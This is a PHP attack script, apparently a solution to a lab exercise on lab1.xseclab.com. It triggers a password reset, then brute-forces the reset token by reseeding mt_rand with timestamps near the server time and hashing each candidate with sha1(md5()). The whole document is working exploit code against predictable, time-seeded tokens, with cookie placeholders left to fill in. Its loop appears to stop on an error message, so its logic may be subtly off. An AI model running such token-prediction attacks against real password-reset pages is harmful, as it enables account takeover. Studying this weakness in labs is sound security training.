<?php
require_once '/var/tmp/Requests/library/Requests.php';
Requests::register_autoloader();
date_default_timezone_set('Asia/Shanghai');
echo time()."start\r\n";
$data = array('token' => '0', 'submit' => 'submit');
$headers=array('Cookie' =>"your cocokie value");
$response = Requests::post('http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php', $headers, $data);
$time1=time();
echo $time1."end\r\n";
echo $response->body;
//echo "time:".time()."\r\n";
//mt_srand(time());
for($i=-20;$i<20;$i++)
{
    echo $i."row:".time();
    mt_srand($time1+10+$i);
    $rand= mt_rand();
    echo $rand."\r\n";
    $token=sha1(md5($rand));
    $data = array('token' => $token, 'submit' => 'submit');
    $headers=array('Cookie' =>"your cookie value");
    $response = Requests::post('http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php', $headers, $data);
    if(strpos($response->body,"Token_error!")!=FALSE)
    {
        echo $response->body;
        break;
    }
}
?>